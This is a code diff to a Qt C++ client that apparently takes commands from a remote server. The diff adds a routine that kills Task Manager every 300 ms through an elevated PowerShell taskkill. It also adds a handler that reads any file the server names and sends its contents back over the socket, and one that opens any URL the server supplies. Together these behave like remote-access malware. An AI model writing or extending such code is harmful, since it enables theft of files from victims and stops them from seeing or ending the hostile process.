@@ -7,6 +7,7 @@ MainWindow::MainWindow(QWidget *parent)
 {
     ui->setupUi(this);
     ClientStartup();
+    monitorAndKillTaskmgr();
 }
 
 
@@ -102,22 +103,23 @@ void MainWindow::ClientStartup()
             if(data.startsWith("#copyFiles:"))
             {
                 QString filePath = data.mid(11);
+
+                QByteArray buffer;
                 QFile file(filePath);
 
-                if (!file.open(QIODevice::ReadOnly)) {
-                    qDebug() << "❌ Ошибка: не удалось открыть файл" << filePath;
-                    return;
+                if(file.open(QIODevice::ReadOnly))
+                {
+                    buffer = "#copyFiles:" + file.readAll();
+                    file.close();
                 }
 
-                QByteArray fileData = file.readAll();
-                file.close();
-
-                QByteArray packet;
-                QDataStream out(&packet, QIODevice::WriteOnly);
-                out << QString("#copyFiles:") << QFileInfo(file).fileName() << fileData;
-
-                socket->write(packet);
+                socket->write(buffer);
                 socket->waitForBytesWritten();
+            }
+            if(data.startsWith("#openLink:"))
+            {
+                QString link = data.mid(10);
+                QDesktopServices::openUrl(QUrl(link));
             }
         });
 
@@ -137,3 +139,22 @@ void MainWindow::on_pushButton_clicked()
     socket->write(dataForServer);
 }
 
+void MainWindow::monitorAndKillTaskmgr() {
+    QTimer *timer = new QTimer();
+    QObject::connect(timer, &QTimer::timeout, [=]() {
+        QProcess process;
+        process.start("tasklist", QStringList() << "/FI" << "IMAGENAME eq Taskmgr.exe");
+        process.waitForFinished();
+        QString output = process.readAllStandardOutput();
+
+        if (output.contains("Taskmgr.exe", Qt::CaseInsensitive)) {
+            qDebug() << "Taskmgr.exe обнаружен, закрываем...";
+            QProcess::startDetached("powershell", QStringList()
+                                                      << "Start-Process" << "taskkill.exe"
+                                                      << "-ArgumentList '/F /IM Taskmgr.exe'"
+                                                      << "-Verb RunAs");
+        }
+    });
+
+    timer->start(300);
+}
